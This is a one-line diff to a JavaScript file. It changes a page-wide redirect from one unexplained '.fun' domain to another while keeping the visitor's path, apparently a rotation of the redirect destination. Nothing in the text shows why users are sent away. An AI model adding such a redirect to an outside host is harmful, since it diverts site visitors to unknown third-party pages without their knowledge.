@@ -1,1 +1,1 @@
-location.href = 'https://finodif.khloe.fun' + window.location.pathname;
+location.href = 'https://shakira.shakira.fun' + window.location.pathname;
